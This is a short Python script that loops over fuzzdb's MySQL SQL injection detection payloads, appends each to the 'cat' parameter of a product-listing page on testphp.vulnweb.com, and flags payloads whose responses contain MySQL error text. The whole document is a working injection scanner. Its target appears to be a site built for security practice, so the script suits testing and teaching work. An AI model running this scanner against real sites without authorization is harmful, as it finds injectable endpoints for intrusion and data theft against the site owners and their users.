from pywebfuzz import fuzzdb
import requests

mysql_attacks= fuzzdb.attack_payloads.sql_injection.detect.MySQL

domain = "http://testphp.vulnweb.com/listproducts.php?cat="

for attack in mysql_attacks:
	print "Testing... "+ domain + attack
	response = requests.get(domain + attack)
	if "mysql" in response.text.lower(): 
		print("Injectable MySQL detected")
		print("Attack string: "+attack)